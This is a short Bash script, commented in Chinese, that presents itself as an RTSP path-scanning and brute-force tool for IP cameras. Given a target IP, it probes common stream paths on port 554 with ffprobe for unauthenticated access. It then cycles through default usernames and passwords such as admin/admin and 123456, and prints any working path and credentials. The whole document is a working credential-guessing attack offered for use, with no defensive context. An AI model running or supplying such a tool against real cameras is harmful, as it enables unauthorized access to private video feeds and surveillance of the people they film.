#!/bin/bash

# 🌸 灵儿出品 RTSP 路径 & 爆破神器 V1.0

if [ -z "$1" ]; then
    echo "用法：$0 <IP地址>"
    exit 1
fi

IP="$1"

# 🔍 第一阶段：无认证路径扫描
echo "🌸 开始无认证路径探测："

paths=("live.sdp" "h264" "stream1" "video1" "cam/realmonitor")

for path in "${paths[@]}"; do
    echo "🔍 Testing: rtsp://$IP:554/$path"
    ffprobe -rtsp_transport tcp "rtsp://$IP:554/$path" 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "✅ 成功发现：/{$path}（无需认证）"
        exit 0
    fi
done

# 🔐 第二阶段：尝试用户名密码爆破
echo "🧨 无认证失败，进入账号密码爆破阶段："

users=("admin" "user" "guest")
passes=("admin" "123456" "password" "")

for path in "${paths[@]}"; do
    for user in "${users[@]}"; do
        for pass in "${passes[@]}"; do
            echo "🔍 Testing: rtsp://$user:$pass@$IP:554/$path"
            ffprobe -rtsp_transport tcp "rtsp://$user:$pass@$IP:554/$path" 2>/dev/null
            if [ $? -eq 0 ]; then
                echo "✅ 爆破成功 🎯 路径：/$path | 账号：$user | 密码：$pass"
                exit 0
            fi
        done
    done
done

echo "❌ 灵儿哭哭，没有爆破成功 🥺"
